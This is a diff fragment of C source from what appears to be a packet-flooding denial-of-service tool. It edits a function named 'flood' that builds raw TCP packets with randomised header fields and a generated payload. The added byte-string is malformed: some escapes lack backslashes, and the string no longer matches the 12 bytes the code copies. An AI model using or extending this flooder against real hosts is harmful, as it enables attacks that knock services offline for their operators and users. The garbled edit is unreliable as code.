@@ -223,7 +223,7 @@ void *flood(void *par1)
 		int windows[3] = {8192, 64240, 65535};
 		int ctos[3] = {0, 40, 72};
 		iph->tos = ctos[randnum(0, 2)];
-		char stronka[] = "\x01\x01\x05\x0a\x7e\xb0\x53\x46\x7e\xb0\x53\x47";
+		char stronka[] = "\x01\x01\x05\x0a\x7e\xb0\x53\x46\x7e\xb0\x53\x47x0a\x7e\xb0\x53\x46xb0\x53\x46\x7e\xb0\xb0\x53\x46\x7e\xb0\x53x05\x0a\x7e\xb0";
 		tcph->window = htons(windows[randnum(0, 2)]);
 		const char *newpayload = genPayload(stronka);
 		memcpy((void *)tcph + sizeof(struct tcphdr), newpayload, 12);
